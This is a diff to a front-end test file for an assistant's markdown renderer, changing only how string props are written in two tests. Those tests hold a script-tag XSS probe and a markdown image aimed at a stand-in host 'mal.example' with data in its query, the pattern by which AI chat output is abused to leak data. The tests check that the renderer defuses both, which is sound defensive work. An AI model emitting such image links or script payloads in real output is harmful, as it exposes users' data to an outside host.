@@ -33,7 +33,7 @@ test('draws markdown, tables included', async () => {
 
 test('raw HTML stays text', async () => {
   const { container } = render(
-    <AssistantMarkdown text={'<script>alert(1)</script> <b>hola</b> fin'} />,
+    <AssistantMarkdown text="<script>alert(1)</script> <b>hola</b> fin" />,
   );
 
   expect(await screen.findByText(/fin/)).toBeInTheDocument();
@@ -43,7 +43,7 @@ test('raw HTML stays text', async () => {
 
 test('a picture never loads, so it cannot carry data away', async () => {
   const { container } = render(
-    <AssistantMarkdown text={'Listo ![x](https://mal.example/?d=ventas)'} />,
+    <AssistantMarkdown text="Listo ![x](https://mal.example/?d=ventas)" />,
   );
 
   expect(await screen.findByText(/Listo/)).toBeInTheDocument();
